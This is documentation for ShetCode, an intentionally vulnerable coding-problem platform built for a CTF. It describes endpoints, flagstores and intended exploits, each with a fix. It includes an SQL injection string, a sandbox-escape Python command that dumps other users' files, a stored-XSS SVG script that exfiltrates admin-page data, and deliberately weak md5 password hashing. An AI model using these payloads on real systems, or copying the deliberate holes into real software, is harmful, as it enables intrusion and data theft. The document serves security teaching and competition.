# ShetCode Documentation

- [Introduction](#introduction)
- [Architecture](#architecture)
- [Installation](#installation)
  - [Running the Service](#running-the-service)
  - [Running the Checker](#running-the-checker)
- [Usage](#usage)
  - [Landing Page](#landing-page)
  - [Registration](#registration)
  - [Login](#login)
  - [Problems](#problems)
    - [Browse and Filter](#browse-and-filter)
    - [Create](#create)
    - [Drafts](#drafts)
    - [Edit and Publish](#edit-and-publish)
    - [Private Problems and Access Control](#private-problems-and-access-control)
    - [Problem Details and Submissions](#problem-details-and-submissions)
  - [Feedback](#feedback)
  - [Admin Flow](#admin-flow)
    - [Admin Challenge](#admin-challenge)
    - [Admin Dashboard](#admin-dashboard)
    - [Admin Feedback View](#admin-feedback-view)
- [Flagstores](#flagstores)
  - [FS0: Draft Problem Descriptions](#fs0-draft-problem-descriptions)
  - [FS1: Saved Solution Files](#fs1-saved-solution-files)
  - [FS2: Feedback and Admin View](#fs2-feedback-and-admin-view)
- [Intended Exploits and Fixes](#intended-exploits-and-fixes)
  - [SQL Injection in Problems API](#sql-injection-in-problems-api)
  - [Sandbox Breakout via Code Execution](#sandbox-breakout-via-code-execution)
  - [Stored XSS via SVG in Admin Feedback](#stored-xss-via-svg-in-admin-feedback)
- [File Structure](#file-structure)
  - [Service](#service)
  - [Checker](#checker)
  - [Documentation Assets](#documentation-assets)

## Introduction

ShetCode is a [LeetCode](https://leetcode.com/)-like platform built with Symfony and PostgreSQL. It supports public/private coding problems, sandboxed Python execution, and feedback submission. It is designed as a CTF service with multiple flagstores and intended vulnerabilities.

## Architecture

- Web app: Symfony (PHP-FPM + Nginx)
- DB: PostgreSQL
- Cache: Redis (for application caching)
- Code execution: nsjail + Python3, per-submission directory under `public/submissions`

## Installation

### Running the Service

```bash
git clone https://github.com/enowars/enowars9-service-shetcode.git
cd enowars9-service-shetcode
cd service
# Optionally set secrets
export POSTGRES_DB=app
export POSTGRES_PASSWORD=postgres
export APP_SECRET=$(openssl rand -hex 32)

docker compose up --build -d
# Service: http://localhost:8055
```

### Running the Checker

```bash
git clone https://github.com/enowars/enowars9-service-shetcode.git
cd enowars9-service-shetcode
cd checker
docker compose up --build -d
# Checker HTTP: http://localhost:18055 (for ENOEngine)
```

## Usage

### Landing Page
- `GET /` → login/register page if not authenticated, else redirect to problems.
![img](./imgs/registration.png)

### Registration
- `POST /register` with `username`, `password`.
- Password hashing: `md5(password + 'ctf_salt_2024')` (not too weak for CTF, but tricking AI).

### Login
- `POST /login` with `username`, `password`.
- User sessions store `user_id`, `username`.
- Admins go through challenge step before becoming fully authenticated.

### Problems

#### Browse and Filter
- `GET /problems` renders problems list page; optional filter by `author_username`.
- `POST /api/problems` returns JSON list.
![img](./imgs/problems.png)

#### Create
- `GET /problems/create` renders form.
- `POST /problems/create` with:
  - `title` (<= 255), `description` (<= 1000), `difficulty` (easy, medium, hard)
  - `testCases` JSON array, `expectedOutputs` JSON array
  - `maxRuntime` (seconds, capped to 1)
  - `isPublished` boolean, `isPrivate` boolean
  - `accessUsers` comma-separated usernames (for private problems)

![img](./imgs/create.png)

#### Drafts
- `GET /problems/drafts` lists user's unpublished problems.

#### Edit and Publish
- `GET /problems/{id}/edit`
- `POST /problems/{id}/edit`
- `POST /problems/{id}/publish`

#### Private Problems and Access Control
- `GET /private-problems` shows own and shared private problems.
- `GET /private-problems/details/{id}` checks author or explicit access via `PrivateAccess`.

![img](./imgs/private_problems.png)

#### Problem Details and Submissions
- `GET /problems/details/{id}` (or private variant) shows 0–2 example tests.
- Editor preloads last `solution.py` from `public/submissions/{userId}/{problemId or private_id}/`.
- `POST /problems/details/{id}/submit` saves new `solution.py` and executes Python code in nsjail.

![img](./imgs/details.png)

### Feedback
- `GET /feedback` to view/submit own feedback.
- `POST /feedback/submit` with `description` and optional `image` (SVG/PNG/JPEG).
- `GET /feedback/image/{id}` returns image bytes with content-type detection.

![img](./imgs/feedback.png)

### Admin Flow

#### Admin Challenge
- `GET /admin-challenge` returns base64 RSA-encrypted random string inside `<pre>`.
- Admin must decrypt using private key (checker has `admin_private.pem`) and submit within 10s.
- `POST /admin-challenge` with `decrypted_challenge` promotes session to authenticated admin.

![img](./imgs/challenge.png)

#### Admin Dashboard
- `GET /admin` shows dashboard with current “time traveller” message and available functionality.

![img](./imgs/dashboard.png)

#### Admin Message
- `GET/POST /admin/message` shows/sets current message (wipes previous messages).


![img](./imgs/message.png)

#### Admin Feedback View
- `GET /admin/feedback` lists all feedback; inlines uploaded image content.

![img](./imgs/feedback_list.png)

## Flagstores

### FS1: Saved Solution Files
- User submission saved at `public/submissions/{user_id}/{problem_id}/solution.py`.
- Problem detail preloads prior solution; viewing reveals content.
- Exploit path: run Python to list/cat other users’ solutions via mounted `public/submissions`.
- [TODO] Add PoC snippet and sample screenshot

### FS2: Feedback and Admin View
- User `description` appears on admin feedback table.
- Uploaded SVG is inlined on admin page and can run scripts.
- Exploit path: XSS exfiltrates flags by creating a private problem shared with attacker.
- [TODO] Add PoC snippet and sample screenshot

## Intended Exploits and Fixes

This service contains 3 Flagstores:

### SQL Injection in Problems API

#### Exploit
The first flagstore is stored in problem `description` when creating as draft.
- Location: `App\DatabaseManager\FindProblemsByAuthorId::execute()` builds SQL with string concatenation of `author_username` instead of prepared statements:

```php
$sql = "SELECT p.title as title, p.difficulty as difficulty, p.is_published as is_published, p.id as id, p.description as description FROM problems p JOIN users u ON p.author_id = u.id WHERE p.is_published = true";
if ($authorUsername) {
    $sql .= " AND u.username = '" . $authorUsername . "'";
}

$preparedStatement = $this->entityManager->getConnection()->prepare($sql);
$result = $preparedStatement->executeQuery();
return $result->fetchAllAssociative();
```
Bypass ``author_username = anything' OR '1'='1' -- `` as query parameter leaks drafts.

#### Fix

The most obvious fix is to use prepared statements in ORM instead of concatenating strings:

```php
$sql = "SELECT p.title as title, p.difficulty as difficulty, p.is_published as is_published, p.id as id, p.description as description FROM problems p JOIN users u ON p.author_id = u.id WHERE p.is_published = true";
$parameters = [];

if ($authorUsername) {
    $sql .= " AND u.username = :username";
    $parameters['username'] = $authorUsername;
}

$preparedStatement = $this->entityManager->getConnection()->prepare($sql);
$result = $preparedStatement->executeQuery($parameters);
return $result->fetchAllAssociative();
```


### Sandbox Breakout via Code Execution
#### Exploit
The second flagstore is stored in submitted solutions of problems. Some data in docker container is not properly isolated with nsjail and Python code is not cleaned up. This allows users to upload the malicious code that retrieves the data on a disk:

```python
import os
os.system('find ../var/www/html/public/submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
```

- Location: `App\Service\CodeExecutor` mounts `public/submissions` read-only in nsjail and runs `/usr/bin/python3`.

#### Fix
There are two ways to fix the exploit.
The first way is to properly isolate the data with nsjail and forbid access to solutions folder:
```
$cmd = [
                     'nsjail',
                     '--user',         '99999',
                     '--group',        '99999',
                     '--disable_proc',
-                    '--bindmount_ro', '/var/www/html/public/submissions:/var/www/html/public/submissions',
                     '--bindmount',    "$userProblemDir:/sandbox:rw",
+                    '--tmpfsmount',   "/var/www/html/public/submissions",
                     '--chroot',       '/',
                     '--cwd',          '/sandbox',
                     '--',             '/usr/bin/python3', 'solution.py',
]
```
The second way is to properly cleanup submitted Python code. This is an untrivial task as malicious code can use patterns like `im/**/port os; os.system('ls’)` or `getattr(__builtins__, "__import__")("o" + "s").system("ls")` instead of simple `import os`. One possible way is to use additional packages like [RestrictedPython](https://github.com/zopefoundation/RestrictedPython):

```python
#!/usr/bin/env python3
# runner.py

import sys
import json
from RestrictedPython import compile_restricted, safe_builtins
from RestrictedPython.Guards import (
    safer_getattr,
    full_write_guard,
    guarded_iter_unpack_sequence,
)
from RestrictedPython.Eval import (
    default_guarded_getiter,
    default_guarded_getitem,
)

class DirectPrinter:
    def __init__(self, *args, **kwargs):
        pass

    def _call_print(self, args, kwargs=None):
        if kwargs is None:
            kwargs = {}
        if not isinstance(args, (tuple, list)):
            args = (args,)
        print(*args, **kwargs)

with open('solution.py', 'r') as f:
    src = f.read()

glb = {
    '__builtins__':          safe_builtins,             
    '_getattr_':             safer_getattr,             
    '_getitem_':             default_guarded_getitem,   
    '_getiter_':             default_guarded_getiter,   
    '_iter_unpack_sequence_':guarded_iter_unpack_sequence, 
    '_write_':               full_write_guard,          
    '_print_':               DirectPrinter,            
}

glb['__builtins__'].update({
    'input': input,
    'len':   len,
    'int':   int,
    'str':   str,
})

try:
    import warnings
    warnings.filterwarnings(
        "ignore",
        message=".*never reads 'printed' variable.*",
        category=SyntaxWarning
    )
    byte_code = compile_restricted(src, '<string>', 'exec')
    exec(byte_code, glb, None)

    printed = glb.get('printed')
    if printed:
        sys.stdout.write(printed)

except Exception as e:
    sys.stderr.write(f"ERROR: {e}")
    sys.exit(1)
```

### Stored XSS via SVG in Admin Feedback
#### Exploit
The third flagstore is stored in submitted feedback. The service does not clean up the uploaded SVG images. A malicious script inside SVG can retrieve the flags from the page and send them to other server or somewhere in Shetcode service (the checker uses private problems for that).

Example SVG image with malicious script:

```
<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <script type="text/javascript">
          (async () => {{
            try {{
                const rows = document.querySelectorAll('tbody tr');
                if (rows.length === 0) {{
                return;
                }}

                for (const row of rows) {{
                const cell = row.querySelector('td:nth-child(3)');
                const feedbackText = cell ? cell.textContent.trim() : '';
                
                if (!feedbackText || feedbackText === 'SCRIPTED_FLAG_CAPTURED') {{
                    continue;
                }}
                
                const flag = feedbackText;

                const params = new URLSearchParams({{
                    title:           flag,
                    description:     `Captured feedback: ${{flag}}`,
                    difficulty:      'Easy',
                    testCases:       JSON.stringify(['dummy input']),
                    expectedOutputs: JSON.stringify(['dummy output']),
                    maxRuntime:      '1.0',
                    isPublished:     'false',
                    isPrivate:       'true',
                    accessUsers:     '{my_username}'
                }});

                const res = await fetch('/problems/create', {{
                    method:      'POST',
                    credentials: 'include',
                    headers:     {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                    body:        params.toString()
                }});
                }}
            }} catch (e) {{
            }}
          }})();
        </script>
        <rect width="100" height="100" fill="blue" />
    </svg>
```

#### Fix
The submitted images must properly be cleaned up. This also can be done with additional packages:

```
use enshrined\svgSanitize\Sanitizer;
...

  $sanitizer = new Sanitizer();
  $cleanSVG = $sanitizer->sanitize($imageContent);
```

## File Structure

### Service
```
service
├── bin
│   └── console                      # Symfony console
├── composer.json                    # PHP dependencies
├── composer.lock
├── config                           # Symfony configuration
│   ├── bundles.php
│   ├── packages
│   │   ├── cache.yaml
│   │   ├── doctrine_migrations.yaml
│   │   ├── doctrine.yaml
│   │   ├── framework.yaml
│   │   ├── monolog.yaml
│   │   ├── routing.yaml
│   │   ├── security.yaml
│   │   ├── twig.yaml
│   │   └── web_profiler.yaml
│   ├── preload.php
│   ├── routes
│   │   ├── framework.yaml
│   │   ├── security.yaml
│   │   └── web_profiler.yaml
│   ├── routes.yaml
│   └── services.yaml
├── docker                           # Container configs and startup
│   ├── cleanup.sh                   # Trigger PHP cleanup task
│   ├── db-init.sql                  # DB initialization
│   ├── nginx.conf                   # Nginx vhost
│   ├── php-fpm.conf                 # PHP-FPM pool
│   └── start.sh                     # Entrypoint (runs nginx + php-fpm)
├── docker-compose.yml               # Service stack: php, postgres, redis
├── Dockerfile                       # Builds php-fpm + nsjail + app
├── migrations                       # Doctrine migrations (schema)
│   ├── Version20250501203901.php
│   ├── ...                          # More migration versions
├── public
│   └── index.php                    # Front controller
├── src                              # Application source code
│   ├── Command                      # CLI commands
│   │   ├── CreateSampleProblemsCommand.php
│   │   └── PurgeOldDataCommand.php  # Cleanup command
│   ├── Controller                   # HTTP endpoints
│   │   ├── AdminController.php
│   │   ├── FeedbackController.php
│   │   ├── LoginController.php
│   │   └── ProblemController.php
│   ├── DatabaseManager              # DB access helpers
│   │   └── FindProblemsByAuthorId.php
│   ├── Entity                       # Doctrine entities
│   │   ├── AdminMessage.php
│   │   ├── Feedback.php
│   │   ├── PrivateAccess.php
│   │   ├── PrivateProblem.php
│   │   ├── Problem.php
│   │   └── User.php
│   ├── EventSubscriber              # Session/Request subscribers
│   │   └── SessionTimeoutSubscriber.php
│   ├── Service                      # Domain services
│   │   ├── CodeExecutor.php         # nsjail-based Python runner
│   │   └── ImageHandler.php         # Image IO and response
│   └── Kernel.php                   # Symfony kernel
├── symfony.lock                     # Symfony dependencies
├── templates                        # Twig templates (views)
│   ├── admin
│   │   ├── admin_challenge.html.twig
│   │   ├── dashboard.html.twig
│   │   ├── feedback.html.twig
│   │   └── message.html.twig
│   ├── base.html.twig
│   ├── feedback
│   │   └── index.html.twig
│   ├── login
│   │   └── index.html.twig
│   └── problem
│       ├── create.html.twig
│       ├── detail.html.twig
│       ├── drafts.html.twig
│       ├── edit.html.twig
│       ├── list.html.twig
│       └── private_list.html.twig
└── README.md                        # Service deployment notes
```

### Checker
```
checker
├── docker-compose.yaml              # Checker + Mongo stack
├── Dockerfile                       # Checker container image
├── requirements.txt                 # Python dependencies
└── src
    ├── checker.py                   # Main checker code
    ├── admin_simulator.py           # Admin challenge + headless browser flow
    ├── title_generator.py           # Problem title generator
    ├── message_generator.py         # Admin message generator
    ├── svg_generator.py             # SVG/image generator
    └── gunicorn.conf.py             # Gunicorn config for checker
```